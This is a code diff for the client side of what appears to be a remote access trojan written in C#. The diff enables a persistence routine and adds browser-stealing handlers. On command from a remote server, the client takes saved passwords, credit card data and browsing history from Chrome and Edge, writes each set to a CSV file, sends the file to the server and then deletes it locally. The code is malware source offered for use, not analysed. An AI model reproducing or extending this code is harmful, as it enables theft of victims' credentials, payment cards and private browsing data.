@@ -5,6 +5,7 @@ using System.Text;
 using Client.Commands;
 using Client.Conexion;
 using Client.Crypto;
+using Client.Stealers;
 using Client.Util;
 
 
@@ -19,7 +20,9 @@ namespace Client
 
         public const int SW_HIDE = 0;
 
+        public  string exeDirectory = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);
         public static byte[] getAesKey() { return aesKeyClient; }
+
         static async Task Main(string[] args)
         {
             try
@@ -32,7 +35,7 @@ namespace Client
                 }
 
                 
-                // Functions.AddPersistence();
+                Functions.AddPersistence();
 
                 // Iniciar la conexión con el servidor
                 ClientSocket.connect();
@@ -188,12 +191,63 @@ namespace Client
                                     break;
 
                                 case Channel.BrowserModule:
-                                    string installedBrowsers = Functions.ListInstalledBrowsers();
-                                    ClientSocket.SendResponse(installedBrowsers, Channel.BrowserModule);
+
+                                    if (Encoding.UTF8.GetString(payload) == "browsers")
+                                    {
+                                        string installedBrowsers = Functions.ListInstalledBrowsers();
+                                        ClientSocket.SendResponse(installedBrowsers, Channel.BrowserModule);
+
+                                    }
+                                    else if (Encoding.UTF8.GetString(payload) == "chrome_password")
+                                    {
+                                        ChromeStealer.getChromePasswords();
+                                        string passwordsPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "chrome_passwords.csv");
+                                        FileManager.sendFile(passwordsPath);
+                                        Thread.Sleep(1000);
+                                        File.Delete("chrome_passwords.csv");
+                                    }
+                                    else if (Encoding.UTF8.GetString(payload) == "chrome_cards")
+                                    {
+                                        ChromeStealer.getChromeCCs();
+                                        string ccsPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "chrome_ccs.csv");
+                                        FileManager.sendFile(ccsPath);
+                                        Thread.Sleep(1000);
+                                        File.Delete("chrome_ccs.csv");
+                                    }
+                                    else if (Encoding.UTF8.GetString(payload) == "chrome_history")
+                                    {
+                                        ChromeStealer.getChromeHistory();
+                                        string historyPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "chrome_history.csv");
+                                        FileManager.sendFile(historyPath);
+                                        Thread.Sleep(1000);
+                                        File.Delete("chrome_history.csv");
+                                    }
+                                    else if (Encoding.UTF8.GetString(payload) == "edge_cards")
+                                    {
+                                        EdgeStealer.getEdgeCcs();
+                                        string ccsPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "edge_ccs.csv");
+                                        FileManager.sendFile(ccsPath);
+                                        Thread.Sleep(1000);
+                                        File.Delete("edge_ccs.csv");
+                                    }
+                                    else if (Encoding.UTF8.GetString(payload) == "edge_password")
+                                    {
+                                        EdgeStealer.getEdgePasswords();
+                                        string passwordsPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "edge_passwords.csv");
+                                        FileManager.sendFile(passwordsPath);
+                                        Thread.Sleep(1000);
+                                        File.Delete("edge_passwords.csv");
+                                    }
+                                    else if (Encoding.UTF8.GetString(payload) == "edge_history")
+                                    {
+                                        EdgeStealer.getEdgeHistory();
+                                        string passwordsPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "edge_history.csv");
+                                        FileManager.sendFile(passwordsPath);
+                                        Thread.Sleep(1000);
+                                        File.Delete("edge_history.csv");
+                                    }
+
                                     break;
-
-
-
                             }
                         }
                         else
@@ -230,7 +284,5 @@ namespace Client
                 total += read;
             }
         }
-
-
     }
 }
